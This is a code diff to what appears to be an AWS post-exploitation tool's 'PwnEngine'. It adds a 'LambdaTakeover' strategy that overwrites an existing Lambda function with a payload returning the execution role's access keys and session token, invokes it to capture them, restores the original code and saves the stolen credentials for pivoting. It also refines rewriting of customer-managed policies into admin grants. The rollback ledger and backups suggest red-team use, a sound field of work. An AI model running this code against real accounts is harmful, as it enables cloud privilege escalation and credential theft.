@@ -26,7 +26,9 @@ than reimplementing credential capture.
 from __future__ import annotations
 
 import json
+import os
 import re
+import urllib.request
 import uuid
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
@@ -51,7 +53,14 @@ from .models import (
     Node,
     NodeKind,
 )
-from .state import State, find_captured_cred, save_captured_cred, save_state
+from .state import (
+    State,
+    find_captured_cred,
+    loot_dir_path,
+    save_captured_cred,
+    save_state,
+    secure_mkdir,
+)
 
 ADMIN_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"
 _INLINE_ADMIN_DOC = {
@@ -277,7 +286,10 @@ class PwnEngine:
         ident = client.identity
         ctx = {
             "AWS_AUTH": "",  # in-process execution uses the client, not the CLI
-            "ACCOUNT_ID": self.account or ident.account,
+            # Prefer the LIVE identity's account: after a cross-account pivot the
+            # engine's origin account is stale, and templates must target the
+            # account the current credentials actually belong to.
+            "ACCOUNT_ID": ident.account or self.account,
             # Regional resources (secret/param/bucket) carry their own region on
             # the node; principals have none, so this falls back to the engine
             # region. Reading a us-east-1 client against a eu-west-1 secret ARN
@@ -645,7 +657,11 @@ def _strat_create_policy_version(engine, client, edge, src, dst, ctx) -> StepRes
     """Rewrite a customer-managed policy attached to the current principal to an
     admin grant, set as default. Rollback restores the prior default + deletes
     the version we created."""
-    pol_arn = _pick_customer_managed(src)
+    # Prefer the exact policy ARN that permission evaluation approved for this
+    # edge (mint-time `via_policy`); fall back to picking one off the node only
+    # when the edge predates that. Picking the first attachment blindly can target
+    # a policy the principal is NOT allowed to rewrite.
+    pol_arn = edge.properties.get("via_policy") or _pick_customer_managed(src)
     if not pol_arn:
         return StepResult(ok=False, manual=True,
                           note="no customer-managed policy on the principal to rewrite")
@@ -817,6 +833,202 @@ def _strat_create_lambda(engine, client, edge, src, dst, ctx) -> StepResult:
                       note=f"captured {dst.object_id} creds via Lambda")
 
 
+# ─── Existing-Lambda takeover (credential-gain via UpdateFunctionCode) ────────
+
+
+def _role_name_account(role_arn: str) -> tuple[str, str]:
+    name = role_arn.rsplit("/", 1)[-1]
+    account = role_arn.split(":")[4] if role_arn.count(":") >= 4 else ""
+    return name, account
+
+
+def _sts_role_name_account(sts_arn: str) -> tuple[str, str]:
+    """(role_name, account) from an STS assumed-role ARN. Role NAMES are
+    account-unique, so this is enough to verify identity without a GetRole."""
+    account = sts_arn.split(":")[4] if sts_arn.count(":") >= 4 else ""
+    name = ""
+    if ":assumed-role/" in sts_arn:
+        name = sts_arn.split(":assumed-role/", 1)[1].split("/", 1)[0]
+    return name, account
+
+
+_PY_IDENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
+
+
+def _exfil_zip_for_handler(handler: str) -> Optional[bytes]:
+    """A ZIP whose module path and function match the function's Handler, returning
+    the execution role's ambient credentials from the environment. Returns None
+    when the handler cannot be faithfully reproduced (a non-identifier function, or
+    a module path we cannot express as files) - the caller then refuses the
+    takeover BEFORE mutating, rather than deploying a broken package.
+
+    Lambda's Python handler is `<module.path>.<function>`, where the module path
+    uses DOTS as package separators - so `pkg.mod.handler` is the file
+    `pkg/mod.py` (with `pkg/__init__.py`), NOT `pkg.mod.py`."""
+    module_path, _, func = handler.rpartition(".")
+    if not module_path:            # bare "handler" -> conventional index.py
+        module_path, func = "index", (func or "handler")
+    if not _PY_IDENT.match(func):
+        return None
+    parts = module_path.split(".")
+    if not all(_PY_IDENT.match(p) for p in parts):
+        return None
+    code = (
+        "import os\n"
+        f"def {func}(event, context):\n"
+        "    return {k: os.environ.get(k) for k in "
+        "('AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN')}\n"
+    )
+    files = {"/".join(parts) + ".py": code}
+    for i in range(1, len(parts)):  # __init__.py for each package directory
+        files["/".join(parts[:i]) + "/__init__.py"] = ""
+    return _zip_named_files(files)
+
+
+def _zip_named_files(files: dict) -> bytes:
+    import io
+    import zipfile
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
+        for name, code in files.items():
+            z.writestr(name, code)
+    return buf.getvalue()
+
+
+def _write_package_backup(engine, fn_name: str, data: bytes) -> Optional[str]:
+    """Persist the original deployment package 0600 so a durable ledger rollback
+    can reload it from disk. Returns the path, or None on failure."""
+    try:
+        d = secure_mkdir(loot_dir_path(engine.loot_dir))
+        safe = re.sub(r"[^A-Za-z0-9_.-]", "_", fn_name)
+        path = str(d / f"lambda-backup-{safe}-{uuid.uuid4().hex[:8]}.zip")
+        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+        with os.fdopen(fd, "wb") as f:
+            f.write(data)
+        return path
+    except OSError:
+        return None
+
+
+def _wait_function_updated(lam, fn_name: str) -> None:
+    """Block until the code update has finished deploying. Failures PROPAGATE:
+    during a destructive overwrite/restore we must not invoke before the deploy
+    completes, nor mark a restore reverted if its deploy timed out or failed."""
+    lam.get_waiter("function_updated_v2").wait(
+        FunctionName=fn_name, WaiterConfig={"Delay": 2, "MaxAttempts": 45})
+
+
+def _strat_lambda_takeover(engine, client, edge, src, dst, ctx) -> StepResult:
+    """Hijack an EXISTING function to steal its execution role. Backs up the
+    package, overwrites+invokes to capture creds, restores immediately, verifies
+    the captured identity by STS account + role name, and only marks the ledger
+    entry reverted once the restore succeeds (else leaves it live for rollback)."""
+    p = edge.properties
+    fn_name = p.get("function_name") or dst.name
+    region = p.get("region") or ctx["REGION"]
+    runtime = str(p.get("runtime", ""))
+    role_arn = p.get("role_arn") or dst.object_id
+    if p.get("package_type", "Zip") == "Image" or not runtime.lower().startswith("python"):
+        return StepResult(ok=False, manual=True,
+                          note=f"LambdaTakeover supports ZIP/Python only (got {p.get('package_type')}/{runtime})")
+
+    lam = client.client("lambda", region=region)
+    try:
+        info = lam.get_function(FunctionName=fn_name)
+    except Exception as exc:  # noqa: BLE001
+        return StepResult(ok=False, note=f"get_function failed: {exc}")
+    handler = info.get("Configuration", {}).get("Handler", "") or p.get("handler", "index.handler")
+    code_url = info.get("Code", {}).get("Location", "")
+
+    # Build (and thereby VALIDATE) the exfil package BEFORE any mutation - refuse
+    # the takeover if we cannot faithfully reproduce this handler's module/function.
+    exfil = _exfil_zip_for_handler(handler)
+    if exfil is None:
+        return StepResult(ok=False, manual=True,
+                          note=f"handler '{handler}' cannot be reproduced by the injector - refusing takeover")
+
+    # Back up the ORIGINAL package before mutating - without it, no takeover.
+    try:
+        original = urllib.request.urlopen(code_url, timeout=30).read()  # noqa: S310 - AWS presigned URL
+    except Exception as exc:  # noqa: BLE001
+        return StepResult(ok=False, note=f"could not download package to back up - refusing takeover: {exc}")
+    backup_path = _write_package_backup(engine, fn_name, original)
+    if backup_path is None:
+        return StepResult(ok=False, note="could not persist package backup - refusing takeover")
+
+    # Record the RESTORE on the ledger BEFORE overwriting, so a crash between the
+    # overwrite and the restore still leaves a rollback that reloads from disk.
+    m = engine.record_mutation(
+        "lambda:UpdateFunctionCode", {"FunctionName": fn_name, "op": "takeover-overwrite"},
+        client.identity.arn, BlastRadius.DESTRUCTIVE,
+        undo_api="lambda:UpdateFunctionCode",
+        undo_params={"FunctionName": fn_name, "_region": region, "_backup_path": backup_path},
+        note="lambda takeover: original package backed up; rollback reloads it from disk",
+    )
+
+    try:
+        lam.update_function_code(FunctionName=fn_name, ZipFile=exfil)
+        _wait_function_updated(lam, fn_name)  # do NOT invoke before the deploy completes
+    except Exception as exc:  # noqa: BLE001 - overwrite/deploy failed; ledger entry restores
+        return StepResult(ok=False, note=f"update_function_code failed: {exc} (rollback will restore)")
+
+    captured = None
+    try:
+        resp = lam.invoke(FunctionName=fn_name)
+        if not resp.get("FunctionError"):
+            data = json.loads(resp["Payload"].read().decode())
+            if data and data.get("AWS_ACCESS_KEY_ID"):
+                captured = data
+    except Exception as exc:  # noqa: BLE001
+        engine.log(_dim(f"    invoke failed: {exc}"))
+
+    # Restore ALWAYS, immediately, then reconcile the ledger entry.
+    restored = False
+    try:
+        lam.update_function_code(FunctionName=fn_name, ZipFile=original)
+        _wait_function_updated(lam, fn_name)
+        restored = True
+    except Exception as exc:  # noqa: BLE001
+        engine.log(_color(f"    [!] restore failed - left LIVE on the ledger for rollback: {exc}", C.YELLOW))
+    if restored:
+        m.reverted = True
+        engine.mutation_count = max(0, engine.mutation_count - 1)
+        save_state(engine.state, engine.loot_dir)
+        # The reverted ledger entry no longer needs the on-disk backup.
+        try:
+            os.remove(backup_path)
+        except OSError:
+            pass
+
+    if not captured:
+        return StepResult(ok=False, note="captured no credentials from the function (package restored)")
+
+    # Verify by STS account + role name (role names are account-unique).
+    ident = AwsIdentity(
+        access_key=captured["AWS_ACCESS_KEY_ID"], secret_key=captured["AWS_SECRET_ACCESS_KEY"],
+        session_token=captured.get("AWS_SESSION_TOKEN", ""), arn=role_arn,
+        account=_role_name_account(role_arn)[1], region=region, source="lambda-takeover",
+    )
+    new = AwsClient(ident)
+    try:
+        who = new.client("sts").get_caller_identity()
+    except Exception as exc:  # noqa: BLE001
+        return StepResult(ok=False, note=f"captured creds did not authenticate: {exc}")
+    got_name, got_acct = _sts_role_name_account(who.get("Arn", ""))
+    want_name, want_acct = _role_name_account(role_arn)
+    if got_name != want_name or got_acct != want_acct:
+        return StepResult(ok=False,
+                          note=f"captured identity {who.get('Arn')} != target role {role_arn} - pivot rejected")
+    # Preserve the ACTUAL STS session ARN on the live identity (graph-ID/live-
+    # identity separation). roam uses the edge target as the post-pivot graph id;
+    # the client keeps the session ARN its credentials really resolve to.
+    new.identity.arn = who.get("Arn", role_arn)
+    new.identity.account = who.get("Account", want_acct)
+    engine.save_captured("role-creds", dst, new.identity, note="captured via Lambda takeover")
+    return StepResult(ok=True, new_client=new, captured=[new.identity],
+                      note=f"captured {role_arn} via Lambda takeover of {fn_name}")
+
+
 def _capture_secret(engine, client, edge, src, dst, ctx, value: str, label: str) -> StepResult:
     creds = _extract_aws_creds(value)
     if creds:
@@ -959,6 +1171,7 @@ STRATEGIES: dict[str, Callable] = {
     "CreateLoginProfile": _strat_login_profile,
     "UpdateLoginProfile": _strat_login_profile,
     "CreateLambdaWithRole": _strat_create_lambda,
+    "LambdaTakeover": _strat_lambda_takeover,
     "GetSecretValue": _strat_get_secret,
     "ReadSSMParameter": _strat_read_ssm,
     "ReadS3Object": _strat_read_s3,
